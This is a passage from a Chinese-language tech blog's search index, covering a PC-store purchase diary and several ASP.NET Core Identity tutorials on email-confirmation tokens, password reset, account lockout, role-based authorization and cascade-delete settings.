東西較少，不過該有的都有 再來說說原價屋 其實我基本上沒特別的，不會去跑某屋 原價屋的好處 商品較多，多樣 打折或是優惠好像也比較多 有蝦皮，可以配合蝦皮活動更加優惠買入東西 原價屋的壞處 實體店刷卡要多收錢，大家應該都知道 店裡常常缺貨，尤其贈品類的，都要碰運氣，不然就是等 之前買技嘉水冷式顯卡遇過故障瑕疵，他們幫我調貨後現場檢查，結果遇到漏液，最終被迫改卡款或是退費…..店員現場打開檢查看到漏液，那屎臉我到現在還記得很清楚 客服回覆速度都比欣亞慢，不然就是得打電話直接問 下次買電腦可能去現場拿就沒有一些問題。 ","date":"2023-02-18","objectID":"/blog/posts/2023%E5%B9%B4%E6%AC%A3%E4%BA%9E%E9%9B%BB%E8%85%A6%E8%B3%BC%E8%B2%B7%E8%A8%98/:1:5","tags":["pc"],"title":"2023年欣亞電腦購買記","uri":"/blog/posts/2023%E5%B9%B4%E6%AC%A3%E4%BA%9E%E9%9B%BB%E8%85%A6%E8%B3%BC%E8%B2%B7%E8%A8%98/"},{"categories":["隨意開箱"],"content":"彩蛋 星河電腦螢幕資訊分享站 ","date":"2023-02-18","objectID":"/blog/posts/2023%E5%B9%B4%E6%AC%A3%E4%BA%9E%E9%9B%BB%E8%85%A6%E8%B3%BC%E8%B2%B7%E8%A8%98/:2:0","tags":["pc"],"title":"2023年欣亞電腦購買記","uri":"/blog/posts/2023%E5%B9%B4%E6%AC%A3%E4%BA%9E%E9%9B%BB%E8%85%A6%E8%B3%BC%E8%B2%B7%E8%A8%98/"},{"categories":[".Net Core"],"content":"本篇筆記紀錄使用 Net Core Identity 產生 Token 所做令牌做一些驗證信處理，帳號登入錯誤太多次，我們可以設定安全規則，在多次登入失敗可以封鎖幾分鐘帳號。我們可以產生令牌，令牌是有時效的，超過時間就會過期，這邊令牌非一般 JWT ，他是有 Data Protection API 做一層加密，這邊不會探討這部分。 ","date":"2023-01-30","objectID":"/blog/posts/Net-Core-Identity-%E4%BB%A4%E7%89%8C%E9%A9%97%E8%AD%89%E8%88%87%E5%B8%B3%E8%99%9F%E5%AE%89%E5%85%A8/:0:0","tags":[".netcore","identity","token"],"title":".Net Core Identity 令牌驗證與帳號安全","uri":"/blog/posts/Net-Core-Identity-%E4%BB%A4%E7%89%8C%E9%A9%97%E8%AD%89%E8%88%87%E5%B8%B3%E8%99%9F%E5%AE%89%E5%85%A8/"},{"categories":[".Net Core"],"content":"阻止帳號未驗證信箱登入 AspNetUsers有一個 EmailConfirmed 可以確認是否有驗證信箱。使用前需要在 Startup.cs 的ConfigureServices()中的 RequireConfirmedEmail 屬性設定為true。 services.Configure\u003cIdentityOptions\u003e(options =\u003e { options.SignIn.RequireConfirmedEmail = true; }); // 沒有這一個判斷會走到「登入失敗，請重試」，注意這邊要做這個判斷，使用者才知道是什麼錯誤。 if (user != null \u0026 !user.EmailConfirmed \u0026\u0026 await _userManager.CheckPasswordAsync(user, model.Password)) { ModelState.AddModelError(string.Empty, \"你的信箱尚為進行驗證\"); return View(model); } GIT: 使用者登入做信箱驗證動作 · malagege/NetCoreAuthSample@92872cc ","date":"2023-01-30","objectID":"/blog/posts/Net-Core-Identity-%E4%BB%A4%E7%89%8C%E9%A9%97%E8%AD%89%E8%88%87%E5%B8%B3%E8%99%9F%E5%AE%89%E5%85%A8/:1:0","tags":[".netcore","identity","token"],"title":".Net Core Identity 令牌驗證與帳號安全","uri":"/blog/posts/Net-Core-Identity-%E4%BB%A4%E7%89%8C%E9%A9%97%E8%AD%89%E8%88%87%E5%B8%B3%E8%99%9F%E5%AE%89%E5%85%A8/"},{"categories":[".Net Core"],"content":"電子信箱確認令牌 電子令牌需要使用_userManager.GenerateEmailConfirmationTokenAsync(user)產生令牌(Token)。 這邊可以用Url.Action產生Email驗證頁面連結。透過 _userManager.ConfirmEmailAsync(user,token)進行驗證。 public async Task\u003cIActionResult\u003e RegisterAsync(RegisterViewModel model) { if (ModelState.IsValid) { var user = new ApplicationUser { UserName = model.Email, Email = model.Email, City = model.City, }; var result = await _userManager.CreateAsync(user, model.Password); // 第二個參數密碼要放，沒放不會檢核密碼規則 if (result.Succeeded) { string confirmationLink = await GenerateConfirmactionLinkAsync(user); //當前 admin 新增帳號，導回使用者清單 if(_signInManager.IsSignedIn(User) \u0026\u0026 User.IsInRole(\"Admin\")) { return RedirectToAction(\"userlist\", \"admin\"); } ViewBag.ErrorTitle = \"註冊成功\"; ViewBag.ErrorMessage = \"已經發送一組驗證信，請進行驗證。\"; return View(\"Error\"); } foreach (var error in result.Errors) { ModelState.AddModelError(string.Empty, error.Description); } } return View(model); } private async Task\u003cstring\u003e GenerateConfirmactionLinkAsync(ApplicationUser user) { string token = await _userManager.GenerateEmailConfirmationTokenAsync(user); string confirmationLink = Url.Action(\"ConfirmEmail\", \"Account\", new { userId = user.Id, token = token }, Request.Scheme); return confirmationLink; } 這邊特別提一下，Url.Action(\"ConfirmEmail\", \"Account\", new { userId = user.Id, token = token }, Request.Scheme);裡面的Request.Scheme是什麼，正常這個參數是填寫http或https，但使用這個HttpRequest物件可以對應Server 設定。 ","date":"2023-01-30","objectID":"/blog/posts/Net-Core-Identity-%E4%BB%A4%E7%89%8C%E9%A9%97%E8%AD%89%E8%88%87%E5%B8%B3%E8%99%9F%E5%AE%89%E5%85%A8/:2:0","tags":[".netcore","identity","token"],"title":".Net Core Identity 令牌驗證與帳號安全","uri":"/blog/posts/Net-Core-Identity-%E4%BB%A4%E7%89%8C%E9%A9%97%E8%AD%89%E8%88%87%E5%B8%B3%E8%99%9F%E5%AE%89%E5%85%A8/"},{"categories":[".Net Core"],"content":"產生 NotSupportedException: No IUserTwoFactorTokenProvider\u003cTUser\u003e named ‘Default’ is registered. 錯誤 需要在ConfigureServices()方法添加AddDefaultTokenProviders()，該方法可以用來信箱令牌驗證、密碼重製、雙因子驗證。 接下來就把 View 頁面用上去就完成 \u003ch1\u003e你的電子信箱已經驗證成功\u003c/h1\u003e ","date":"2023-01-30","objectID":"/blog/posts/Net-Core-Identity-%E4%BB%A4%E7%89%8C%E9%A9%97%E8%AD%89%E8%88%87%E5%B8%B3%E8%99%9F%E5%AE%89%E5%85%A8/:2:1","tags":[".netcore","identity","token"],"title":".Net Core Identity 令牌驗證與帳號安全","uri":"/blog/posts/Net-Core-Identity-%E4%BB%A4%E7%89%8C%E9%A9%97%E8%AD%89%E8%88%87%E5%B8%B3%E8%99%9F%E5%AE%89%E5%85%A8/"},{"categories":[".Net Core"],"content":"你可能會忽略程式錯誤但使用者新增上去 理論上我猜Identity 相關 function 裡面有做 SaveChange()，所以我嘗試外面加 TransactionScope 就能解決這個問題。 public async Task\u003cIActionResult\u003e RegisterAsync(RegisterViewModel model) { using var scope = new TransactionScope(TransactionScopeAsyncFlowOption.Enabled); if (ModelState.IsValid) { var user = new ApplicationUser { UserName = model.Email, Email = model.Email, City = model.City, }; var result = await _userManager.CreateAsync(user, model.Password); // 第二個參數密碼要放，沒放不會檢核密碼規則 if (result.Succeeded) { scope.Complete(); string confirmationLink = await GenerateConfirmactionLinkAsync(user); _logger.LogInformation($\"發送驗證信連結:{confirmationLink}\"); //當前 admin 新增帳號，導回使用者清單 if(_signInManager.IsSignedIn(User) \u0026\u0026 User.IsInRole(\"Admin\")) { return RedirectToAction(\"userlist\", \"admin\"); } ViewBag.ErrorTitle = \"註冊成功\"; ViewBag.ErrorMessage = \"已經發送一組驗證信，請進行驗證。\"; return View(\"Error\"); } foreach (var error in result.Errors) { ModelState.AddModelError(string.Empty, error.Description); } } return View(model); } GIT: 申請帳號發送驗證信動作與檢查 · malagege/NetCoreAuthSample@3fbb828 ","date":"2023-01-30","objectID":"/blog/posts/Net-Core-Identity-%E4%BB%A4%E7%89%8C%E9%A9%97%E8%AD%89%E8%88%87%E5%B8%B3%E8%99%9F%E5%AE%89%E5%85%A8/:2:2","tags":[".netcore","identity","token"],"title":".Net Core Identity 令牌驗證與帳號安全","uri":"/blog/posts/Net-Core-Identity-%E4%BB%A4%E7%89%8C%E9%A9%97%E8%AD%89%E8%88%87%E5%B8%B3%E8%99%9F%E5%AE%89%E5%85%A8/"},{"categories":[".Net Core"],"content":"第三方令牌做信箱驗證 跟上面邏輯一樣，由於這邊範例是信箱為key，通常第三方登入綁定原帳號不一定是用信箱，所以這邊就不實作了，不一定要做信箱驗證。 ","date":"2023-01-30","objectID":"/blog/posts/Net-Core-Identity-%E4%BB%A4%E7%89%8C%E9%A9%97%E8%AD%89%E8%88%87%E5%B8%B3%E8%99%9F%E5%AE%89%E5%85%A8/:2:3","tags":[".netcore","identity","token"],"title":".Net Core Identity 令牌驗證與帳號安全","uri":"/blog/posts/Net-Core-Identity-%E4%BB%A4%E7%89%8C%E9%A9%97%E8%AD%89%E8%88%87%E5%B8%B3%E8%99%9F%E5%AE%89%E5%85%A8/"},{"categories":[".Net Core"],"content":"啟用帳號 過了超過驗證信箱時間，我們需要重新發送驗證信功能。更上面差不多事情就不細講，參照GITHUB設定。 GIT: 忘記密碼功能 · malagege/NetCoreAuthSample@f06b336 主要重點_userManager.GeneratePasswordResetTokenAsync產生 token。 [HttpPost] public async Task\u003cIActionResult\u003e ForgetPasswordAsync(EmailAddressViewModel model) { if (ModelState.IsValid) { // 用信箱查詢帳號 ApplicationUser user = await _userManager.FindByNameAsync(model.Email); // 通過驗證才能用此功能 if( user != null \u0026\u0026 await _userManager.IsEmailConfirmedAsync(user)) { string token = await _userManager.GeneratePasswordResetTokenAsync(user); var passwordResetLink = Url.Action(\"ResetPassword\", \"Account\", new { email = model.Email, token }, Request.Scheme); _logger.LogInformation($\"發送驗證信連結:{passwordResetLink}\"); return View(\"ForgetPasswordConfirmation\"); } // 為了防暴力攻擊，不回應任何訊息 return View(\"ForgetPasswordConfirmation\"); } return View(model); } ","date":"2023-01-30","objectID":"/blog/posts/Net-Core-Identity-%E4%BB%A4%E7%89%8C%E9%A9%97%E8%AD%89%E8%88%87%E5%B8%B3%E8%99%9F%E5%AE%89%E5%85%A8/:3:0","tags":[".netcore","identity","token"],"title":".Net Core Identity 令牌驗證與帳號安全","uri":"/blog/posts/Net-Core-Identity-%E4%BB%A4%E7%89%8C%E9%A9%97%E8%AD%89%E8%88%87%E5%B8%B3%E8%99%9F%E5%AE%89%E5%85%A8/"},{"categories":[".Net Core"],"content":"密碼重置功能 ViewModel 原本 DataAnntation 比較密碼第一個參數改成nameof(Password)，可以讓程式可維護性。最近看到 EF 5 設定 Index也是這樣用。 [Compare(\"Password\",ErrorMessage = \"密碼不一置，請重新確認\")] 改成 [Compare(nameof(Password),ErrorMessage = \"密碼不一置，請重新確認\")] 相關設定也請看GIT。 GIT: 重置密碼功能 · malagege/NetCoreAuthSample@7507387 ","date":"2023-01-30","objectID":"/blog/posts/Net-Core-Identity-%E4%BB%A4%E7%89%8C%E9%A9%97%E8%AD%89%E8%88%87%E5%B8%B3%E8%99%9F%E5%AE%89%E5%85%A8/:4:0","tags":[".netcore","identity","token"],"title":".Net Core Identity 令牌驗證與帳號安全","uri":"/blog/posts/Net-Core-Identity-%E4%BB%A4%E7%89%8C%E9%A9%97%E8%AD%89%E8%88%87%E5%B8%B3%E8%99%9F%E5%AE%89%E5%85%A8/"},{"categories":[".Net Core"],"content":"修改令牌時效限制 令牌時效為1天。修改時間方法參照下面程式，這一段我就不放到GIT。 services.Configure\u003cDataProtectionTokenProviderOptions\u003e(options =\u003e { options.TokenLifespan = TimeSpan.FromSeconds(10); }); ","date":"2023-01-30","objectID":"/blog/posts/Net-Core-Identity-%E4%BB%A4%E7%89%8C%E9%A9%97%E8%AD%89%E8%88%87%E5%B8%B3%E8%99%9F%E5%AE%89%E5%85%A8/:5:0","tags":[".netcore","identity","token"],"title":".Net Core Identity 令牌驗證與帳號安全","uri":"/blog/posts/Net-Core-Identity-%E4%BB%A4%E7%89%8C%E9%A9%97%E8%AD%89%E8%88%87%E5%B8%B3%E8%99%9F%E5%AE%89%E5%85%A8/"},{"categories":[".Net Core"],"content":"特定權杖時效限制 參照這篇設定變更電子郵件權杖生命週期，這邊簡單紀錄，但不記到 GIT。 public class CustomEmailConfirmationTokenProvider\u003cTUser\u003e : DataProtectorTokenProvider\u003cTUser\u003e where TUser : class { public CustomEmailConfirmationTokenProvider( IDataProtectionProvider dataProtectionProvider, IOptions\u003cEmailConfirmationTokenProviderOptions\u003e options, ILogger\u003cDataProtectorTokenProvider\u003cTUser\u003e\u003e logger) : base(dataProtectionProvider, options, logger) { } } public class EmailConfirmationTokenProviderOptions : DataProtectionTokenProviderOptions { public EmailConfirmationTokenProviderOptions() { Name = \"EmailDataProtectorTokenProvider\"; TokenLifespan = TimeSpan.FromHours(4); } } builder.Services.AddDefaultIdentity\u003cIdentityUser\u003e(config =\u003e { config.SignIn.RequireConfirmedEmail = true; config.Tokens.ProviderMap.Add(\"CustomEmailConfirmation\", new TokenProviderDescriptor( typeof(CustomEmailConfirmationTokenProvider\u003cIdentityUser\u003e))); config.Tokens.EmailConfirmationTokenProvider = \"CustomEmailConfirmation\"; }).AddEntityFrameworkStores\u003cApplicationDbContext\u003e(); builder.Services.AddTransient\u003cCustomEmailConfirmationTokenProvider\u003cIdentityUser\u003e\u003e(); 簡單跟 Claim 和 Handle 處理有點類似。 ","date":"2023-01-30","objectID":"/blog/posts/Net-Core-Identity-%E4%BB%A4%E7%89%8C%E9%A9%97%E8%AD%89%E8%88%87%E5%B8%B3%E8%99%9F%E5%AE%89%E5%85%A8/:5:1","tags":[".netcore","identity","token"],"title":".Net Core Identity 令牌驗證與帳號安全","uri":"/blog/posts/Net-Core-Identity-%E4%BB%A4%E7%89%8C%E9%A9%97%E8%AD%89%E8%88%87%E5%B8%B3%E8%99%9F%E5%AE%89%E5%85%A8/"},{"categories":[".Net Core"],"content":"其他 userManager 小功能紀錄 現有帳號更改密碼_userManager.ChangePasswordAsync(user, 舊密碼,新密碼)。 第三方沒設置密碼，新增密碼。_userManager.AddPasswordAsync(user, 新密碼)，理論上可能用不到這個功能。後續登入中使用者要用_userManager.RefreshSignInAsync(user)更新使用者登入。 ","date":"2023-01-30","objectID":"/blog/posts/Net-Core-Identity-%E4%BB%A4%E7%89%8C%E9%A9%97%E8%AD%89%E8%88%87%E5%B8%B3%E8%99%9F%E5%AE%89%E5%85%A8/:6:0","tags":[".netcore","identity","token"],"title":".Net Core Identity 令牌驗證與帳號安全","uri":"/blog/posts/Net-Core-Identity-%E4%BB%A4%E7%89%8C%E9%A9%97%E8%AD%89%E8%88%87%E5%B8%B3%E8%99%9F%E5%AE%89%E5%85%A8/"},{"categories":[".Net Core"],"content":"設定密碼太多次錯誤停用帳號 services.Configure\u003cIdentityOptions\u003e加入設定 _signInManager.PasswordSignInAsync第四個參數記得要修改成true 參考如下: services.Configure\u003cIdentityOptions\u003e(options =\u003e { ... // 預設帳號密碼輸入五次會封鎖15分鐘(封鎖時間預設是5分鐘) options.Lockout.MaxFailedAccessAttempts = 5; options.Lockout.DefaultLockoutTimeSpan = TimeSpan.FromMinutes(15); }); _signInManager.PasswordSignInAsync第四個參數記得要修改成true Microsoft.AspNetCore.Identity.SignInResult result = await _signInManager.PasswordSignInAsync(model.Email, model.Password, model.RememberMe, true); 我們嘗試輸入多組錯誤密碼明顯看到資料庫有修改。 登入中調整登入成功顯示帳號被鎖。重置密碼功能也要設定解除鎖定。 LoginAsync 方法 // 使用者封鎖不讓使用者登入，但我建議可以不提示讓使用者知道，可發信通知使用者知道 //if (result.IsLockedOut) //{ // return View(\"AccountLocked\"); //} ResetPasswordAsync方法 if(result.Succeeded) { // 讓當前已封鎖使用者解除封鎖動作 if ( await _userManager.IsLockedOutAsync(user)) { await _userManager.SetLockoutEndDateAsync(user, DateTimeOffset.UtcNow); } return View(\"ResetPasswordConfirmation\"); } GIT: 設定密碼太多次錯誤停用帳號 · malagege/NetCoreAuthSample@e52ee78 ","date":"2023-01-30","objectID":"/blog/posts/Net-Core-Identity-%E4%BB%A4%E7%89%8C%E9%A9%97%E8%AD%89%E8%88%87%E5%B8%B3%E8%99%9F%E5%AE%89%E5%85%A8/:7:0","tags":[".netcore","identity","token"],"title":".Net Core Identity 令牌驗證與帳號安全","uri":"/blog/posts/Net-Core-Identity-%E4%BB%A4%E7%89%8C%E9%A9%97%E8%AD%89%E8%88%87%E5%B8%B3%E8%99%9F%E5%AE%89%E5%85%A8/"},{"categories":[".Net Core"],"content":"心得 其實還有很多沒有記，但目前先整理到這邊。 像是 Jwtbearer AddIdentityServer Two-Factor 很多寶藏還沒挖，有時間再整理研究。 ","date":"2023-01-30","objectID":"/blog/posts/Net-Core-Identity-%E4%BB%A4%E7%89%8C%E9%A9%97%E8%AD%89%E8%88%87%E5%B8%B3%E8%99%9F%E5%AE%89%E5%85%A8/:8:0","tags":[".netcore","identity","token"],"title":".Net Core Identity 令牌驗證與帳號安全","uri":"/blog/posts/Net-Core-Identity-%E4%BB%A4%E7%89%8C%E9%A9%97%E8%AD%89%E8%88%87%E5%B8%B3%E8%99%9F%E5%AE%89%E5%85%A8/"},{"categories":[".Net Core"],"content":"彩蛋 How to confirm a phone number in ASP.Net Core 1.1MVC - Stack Overflow ASP.NET Core 自动刷新JWT Token_My IO的技术博客_51CTO博客 ASP.NET Core Web Api之JWT刷新Token(三) - Jeffcky - 博客园 ","date":"2023-01-30","objectID":"/blog/posts/Net-Core-Identity-%E4%BB%A4%E7%89%8C%E9%A9%97%E8%AD%89%E8%88%87%E5%B8%B3%E8%99%9F%E5%AE%89%E5%85%A8/:9:0","tags":[".netcore","identity","token"],"title":".Net Core Identity 令牌驗證與帳號安全","uri":"/blog/posts/Net-Core-Identity-%E4%BB%A4%E7%89%8C%E9%A9%97%E8%AD%89%E8%88%87%E5%B8%B3%E8%99%9F%E5%AE%89%E5%85%A8/"},{"categories":[".Net Core"],"content":"驗證與授權是很常用在帳號登入權限判斷，驗證(Authientication)和授權(Authorization)要先瞭解這兩個名詞才能順暢了解範例在做什麼。 ","date":"2023-01-16","objectID":"/blog/posts/DotNet-Core-Identity-%E5%81%9A-Authorize/:0:0","tags":[".netcore","identity","authorize"],"title":".Net Core Identity 做 Authorize","uri":"/blog/posts/DotNet-Core-Identity-%E5%81%9A-Authorize/"},{"categories":[".Net Core"],"content":"驗證與授權關係 ","date":"2023-01-16","objectID":"/blog/posts/DotNet-Core-Identity-%E5%81%9A-Authorize/:1:0","tags":[".netcore","identity","authorize"],"title":".Net Core Identity 做 Authorize","uri":"/blog/posts/DotNet-Core-Identity-%E5%81%9A-Authorize/"},{"categories":[".Net Core"],"content":"驗證(Authientication) 判斷是否有登入帳號資訊 ","date":"2023-01-16","objectID":"/blog/posts/DotNet-Core-Identity-%E5%81%9A-Authorize/:1:1","tags":[".netcore","identity","authorize"],"title":".Net Core Identity 做 Authorize","uri":"/blog/posts/DotNet-Core-Identity-%E5%81%9A-Authorize/"},{"categories":[".Net Core"],"content":"授權(Authorization) 判斷使用者是否能有網頁資源(Resource)。不是只驗證使用者帳號，重點是否有權限進入頁面。 以上簡單用自己了解說明。詳細可Google查詢。 了解這兩個名詞在實作接下來內容才可能比較清楚 ","date":"2023-01-16","objectID":"/blog/posts/DotNet-Core-Identity-%E5%81%9A-Authorize/:1:2","tags":[".netcore","identity","authorize"],"title":".Net Core Identity 做 Authorize","uri":"/blog/posts/DotNet-Core-Identity-%E5%81%9A-Authorize/"},{"categories":[".Net Core"],"content":"Authorize 屬性 GIT: AccountManage 加入授權設定 · malagege/NetCoreAuthSample@bc5bb3f Controller 用上[Authorize]就可以判斷使用者能否取得資源。這邊可以用來判斷使用者是否登入過帳號，這邊可以針對角色做調整，後續文章會在整理。 可在class上面加上[Authorize]，每個 method 都會做授權判斷。也可以獨立在 method 做。 ","date":"2023-01-16","objectID":"/blog/posts/DotNet-Core-Identity-%E5%81%9A-Authorize/:2:0","tags":[".netcore","identity","authorize"],"title":".Net Core Identity 做 Authorize","uri":"/blog/posts/DotNet-Core-Identity-%E5%81%9A-Authorize/"},{"categories":[".Net Core"],"content":"多角色授權注意事項 下面為 Admin或 User 角色可以授權此類別。 [Authorize(Roles = \"Admin,User\")] public class AController:Controller{ } 下面為Admin和User兩者角色符合才能授權此類別。 [Authorize(Roles = \"Admin\")] [Authorize(Roles = \"User\")] public class AController:Controller{ } 使用上需要注意。 ","date":"2023-01-16","objectID":"/blog/posts/DotNet-Core-Identity-%E5%81%9A-Authorize/:2:1","tags":[".netcore","identity","authorize"],"title":".Net Core Identity 做 Authorize","uri":"/blog/posts/DotNet-Core-Identity-%E5%81%9A-Authorize/"},{"categories":[".Net Core"],"content":"全局授權驗證 ","date":"2023-01-16","objectID":"/blog/posts/DotNet-Core-Identity-%E5%81%9A-Authorize/:3:0","tags":[".netcore","identity","authorize"],"title":".Net Core Identity 做 Authorize","uri":"/blog/posts/DotNet-Core-Identity-%E5%81%9A-Authorize/"},{"categories":[".Net Core"],"content":"Middleware 設定做確認授權動作 參考:ASP.NET Core中以原則為基礎的授權 | Microsoft Docs app.UseEndpoints(endpoints =\u003e { // equivalent of [Authorize] attribute on each controller: endpoints.MapDefaultControllerRoute().RequireAuthorization(); }); ","date":"2023-01-16","objectID":"/blog/posts/DotNet-Core-Identity-%E5%81%9A-Authorize/:3:1","tags":[".netcore","identity","authorize"],"title":".Net Core Identity 做 Authorize","uri":"/blog/posts/DotNet-Core-Identity-%E5%81%9A-Authorize/"},{"categories":[".Net Core"],"content":"filter 註冊 public void ConfigureServices(IServiceCollection services) { //全局添加AuthorizeFilter 过滤器方式 services.AddControllers(options=\u003eoptions.Filters.Add(new AuthorizeFilter())); 參考:Asp.Net Core Authorize你不知道的那些事（源码解读） - Jlion - 博客园 推薦好奇源碼怎麼做到，可以看裡面內容 ","date":"2023-01-16","objectID":"/blog/posts/DotNet-Core-Identity-%E5%81%9A-Authorize/:3:2","tags":[".netcore","identity","authorize"],"title":".Net Core Identity 做 Authorize","uri":"/blog/posts/DotNet-Core-Identity-%E5%81%9A-Authorize/"},{"categories":[".Net Core"],"content":"AccessDenied 訪問頁面 GIT: AccessDenied 拒絕訪問功能 · malagege/NetCoreAuthSample@066d9d2 我們暫時 Authorize 把 Roles 加上隨便一個角色，如下方程式碼。 namespace AuthSample.Controllers { [Authorize(Roles = \"Admin\")] public class AdminController : Controller 開啟http://localhost:50000/admin/rolelist會倒到http://localhost:50000/Account/AccessDenied?ReturnUrl=%2Fadmin%2Frolelist。這邊可以看到得到404結果。 這邊我們要寫死一個類別方法，在AuthSample\\Controllers\\AccountController.cs 有面新增一個AccessDenied方法，在AuthSample\\Views\\Account\\AccessDenied.cshtml顯示錯誤訊息。 public class AccountController : Controller { public IActionResult AccessDenied() { return View(); } AuthSample\\Views\\Account\\AccessDenied.cshtml \u003cdiv\u003e \u003ch1\u003e無權限訪問\u003c/h1\u003e \u003c/div\u003e ","date":"2023-01-16","objectID":"/blog/posts/DotNet-Core-Identity-%E5%81%9A-Authorize/:4:0","tags":[".netcore","identity","authorize"],"title":".Net Core Identity 做 Authorize","uri":"/blog/posts/DotNet-Core-Identity-%E5%81%9A-Authorize/"},{"categories":[".Net Core"],"content":"API 錯誤回應 這個用在 WebAPI感決怪怪的。我在Authentication In An ASP.NET Core API - Part 1: Identity, Access Denied | Pioneer Code有看到解決方式 services.Configure\u003cIdentityOptions\u003e(config =\u003e { config.Cookies.ApplicationCookie.Events = new CookieAuthenticationEvents { OnRedirectToLogin = ctx =\u003e { if (ctx.Request.Path.StartsWithSegments(\"/api\") \u0026\u0026 ctx.Response.StatusCode == 200) { ctx.Response.StatusCode = 401; return Task.FromResult\u003cobject\u003e(null); } ctx.Response.Redirect(ctx.RedirectUri); return Task.FromResult\u003cobject\u003e(null); } }; }); 其他參考:[ASP.NET Core] 啟用 UseAuthentication 後，讓MVC及API驗證失敗時有不同的行為 | Ian Chen - 點部落 但我看很多 API 都純後端可能沒加 CookieAuthenticationDefaultsm 驗證，所以可有做這個驗證。 .NET Core 2.0 Cookie Events OnRedirectToLogin - Stack Overflow ","date":"2023-01-16","objectID":"/blog/posts/DotNet-Core-Identity-%E5%81%9A-Authorize/:4:1","tags":[".netcore","identity","authorize"],"title":".Net Core Identity 做 Authorize","uri":"/blog/posts/DotNet-Core-Identity-%E5%81%9A-Authorize/"},{"categories":[".Net Core"],"content":"AllowAnonymous 屬性 GIT: AccountManage 加入授權設定 · malagege/NetCoreAuthSample@bc5bb3f 做 Authorize 動作的class有些方法需排除驗證授權，這邊需要加上[AllowAnonymous]。 ","date":"2023-01-16","objectID":"/blog/posts/DotNet-Core-Identity-%E5%81%9A-Authorize/:5:0","tags":[".netcore","identity","authorize"],"title":".Net Core Identity 做 Authorize","uri":"/blog/posts/DotNet-Core-Identity-%E5%81%9A-Authorize/"},{"categories":[".Net Core"],"content":"登入失敗會自動導入登入頁 GIT: 登入導向頁面 · malagege/NetCoreAuthSample@62198ab http://localhost:50000/AccountManage/ 像是會自動導回http://localhost:50000/Account/Login?ReturnUrl=%2FAccountManage%2F。 所以login需要特別做ReturnUrl處理。 ","date":"2023-01-16","objectID":"/blog/posts/DotNet-Core-Identity-%E5%81%9A-Authorize/:6:0","tags":[".netcore","identity","authorize"],"title":".Net Core Identity 做 Authorize","uri":"/blog/posts/DotNet-Core-Identity-%E5%81%9A-Authorize/"},{"categories":[".Net Core"],"content":"相關文章 Asp.Net Core Authorize你不知道的那些事（源码解读） - Jlion - 博客园 [Day14] ASP.NET Core 2 系列 - Filters - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 ASP.NET Core中如何定制AuthorizeAttribute 備份圖 自訂 AuthorizationMiddleware 的行為 | Microsoft Docs ","date":"2023-01-16","objectID":"/blog/posts/DotNet-Core-Identity-%E5%81%9A-Authorize/:7:0","tags":[".netcore","identity","authorize"],"title":".Net Core Identity 做 Authorize","uri":"/blog/posts/DotNet-Core-Identity-%E5%81%9A-Authorize/"},{"categories":[".Net Core"],"content":"通常我們使用微軟建立好的資料表不會注意他有做那些關聯，功能方便，在使用的時候也需要注意一些事情，這邊特別記錄資料表關聯調整，設定上程式碼需要調整什麼。 ","date":"2023-01-16","objectID":"/blog/posts/DotNet-Core-Identity-%E5%B8%B3%E8%99%9F%E8%88%87%E8%A7%92%E8%89%B2%E9%97%9C%E8%81%AF%E5%88%AA%E9%99%A4/:0:0","tags":[".netcore","identity","rbac","sql"],"title":".Net Core Identity 帳號與角色關聯刪除","uri":"/blog/posts/DotNet-Core-Identity-%E5%B8%B3%E8%99%9F%E8%88%87%E8%A7%92%E8%89%B2%E9%97%9C%E8%81%AF%E5%88%AA%E9%99%A4/"},{"categories":[".Net Core"],"content":"Entity Framework Core 關聯刪除 Entity Framework Core 关联删除 - Sweet-Tang - 博客园 SQL 4種行為 在SQL Server中支持如下四種行為： ON DELETE NO ACTION 默認行為，刪除主表數據行時，依賴表中的數據不會執行任何操作，此時會產生錯誤，並回滾DELETE語句。例如會產生下面的錯誤： DELETE 語句與 REFERENCE 約束\"FK_Order Details_Orders_OrderID\"衝突。該衝突發生於數據庫\"Northwind_Test\"，表\"dbo.Order Details\", column 'OrderID'。 語句已終止。 ON DELETE CASCADE 刪除主表數據行時，依賴表的中數據行也會同步刪除。 ON DELETE SET NULL 刪除主表數據行時，將依賴表中數據行的外鍵更新為NULL。為了滿足此約束，目標表的外鍵列必須可為空值。 ON DELETE SET DEFAULT 刪除主表數據行時，將依賴表的中數據行的外鍵更新為默認值。為了滿足此約束，目標表的所有外鍵列必須具有默認值定義；如果外鍵可為空值，並且未顯式設置默認值，則將使用NULL作為該列的隱式默認值。 簡單介紹了數據庫中行為後，我們來著重介紹 EF Core 中的關聯實體的行為。 ","date":"2023-01-16","objectID":"/blog/posts/DotNet-Core-Identity-%E5%B8%B3%E8%99%9F%E8%88%87%E8%A7%92%E8%89%B2%E9%97%9C%E8%81%AF%E5%88%AA%E9%99%A4/:1:0","tags":[".netcore","identity","rbac","sql"],"title":".Net Core Identity 帳號與角色關聯刪除","uri":"/blog/posts/DotNet-Core-Identity-%E5%B8%B3%E8%99%9F%E8%88%87%E8%A7%92%E8%89%B2%E9%97%9C%E8%81%AF%E5%88%AA%E9%99%A4/"},{"categories":[".Net Core"],"content":"預設 Identity 資料表動作(級聯刪除 CasCade) Identity 資料表動作預設為級聯刪除(CasCade) ，這邊要注意 SQL Server 預設為 NoAction，Identity 資料表預設不知道為什麼做級聯刪除 (CasCade)。但我們可以手動改掉他。 下圖是看資料表建立的Schema，可以看外鍵設定。 這邊可以直接測試看看 GIT: 刪除使用者 · malagege/NetCoreAuthSample@01b8e0a ","date":"2023-01-16","objectID":"/blog/posts/DotNet-Core-Identity-%E5%B8%B3%E8%99%9F%E8%88%87%E8%A7%92%E8%89%B2%E9%97%9C%E8%81%AF%E5%88%AA%E9%99%A4/:2:0","tags":[".netcore","identity","rbac","sql"],"title":".Net Core Identity 帳號與角色關聯刪除","uri":"/blog/posts/DotNet-Core-Identity-%E5%B8%B3%E8%99%9F%E8%88%87%E8%A7%92%E8%89%B2%E9%97%9C%E8%81%AF%E5%88%AA%E9%99%A4/"},{"categories":[".Net Core"],"content":"防止連同刪除方法 GIT: 角色防止連動刪除用戶關連資料 · malagege/NetCoreAuthSample@0a6a78f 全部外鍵設定 Restrict AppContextDb.cs // base.OnModelCreating(modelBuilder); var foreignKeys = modelBuilder.Model.GetEntityTypes().SelectMany(e =\u003e e.GetForeignKeys()); foreach (var foreignKey in foreignKeys) { foreignKey.DeleteBehavior = DeleteBehavior.Restrict; } powershell Add-Migration DeleteBehaviorRestrict 不知道是不是新版關係，我們這邊會出錯 The entity type 'IdentityUserLogin\u003cstring\u003e' requires a primary key to be defined. If you intended to use a keyless entity type, call 'HasNoKey' in 